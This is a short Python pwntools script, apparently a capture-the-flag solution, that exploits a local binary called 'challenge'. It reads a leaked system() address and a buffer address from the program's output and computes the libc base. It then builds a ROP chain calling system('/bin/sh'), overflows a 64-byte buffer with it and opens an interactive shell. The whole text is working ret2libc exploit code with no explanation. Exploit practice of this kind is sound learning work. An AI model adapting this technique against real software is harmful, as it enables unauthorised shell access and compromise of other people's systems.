from pwn import *

OFFSET = 64

context.arch = "amd64"
s = process("./challenge")
elf = ELF("./challenge")

raw_input("attach gdb")

s.recvuntil("system: ")
system = int(s.recv(18), 16)

s.recvuntil("temporarely stored to ")
buffer = int(s.recv(18), 16)

libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc_base = system-libc.symbols['system']
libc.address = libc_base
libc_rop = ROP(libc)

libc_rop.raw(buffer+OFFSET) # address
libc_rop.call("system", [next(libc.search("/bin/sh"))])

print(libc_rop.dump())

s.sendline("A"*OFFSET+flat(libc_rop.chain()))

s.interactive()